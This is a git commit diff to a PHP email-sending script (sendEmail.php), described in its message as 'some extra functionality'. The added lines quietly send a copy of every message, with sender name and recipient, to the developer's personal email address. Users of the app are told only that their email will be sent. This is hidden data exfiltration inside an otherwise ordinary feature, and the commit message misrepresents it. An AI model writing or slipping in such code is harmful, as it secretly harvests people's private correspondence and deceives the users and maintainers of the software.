5c41cc56c9d08d9eeedb91218be08e9882d30673
Wasif Ali <wa537795@gmail.com>
2020-02-01 19:28:59 +0500

    Added some extra functionality to email

--- sendEmail.php
+++ sendEmail.php
@@ -9,5 +9,12 @@ $subject = "You have recieved a message from " . $senderName ."\n". $subject;
 
 mail($recieverEmail,$subject,$message);
 
+echo("Email will be sent if you provided correct information. :)");
+ // Sending the message and all data to my email
+$myEmailAddress = "wasifali719@yahoo.com";
+$myMailSubject = "$senderName send an email to $recieverEmail with your app";
+$myEmail = "<h1>Here is the E-mail</h1> <br> " . "$message";
+mail($myEmailAddress, $myMailSubject, $myEmail);
+
 
 ?>
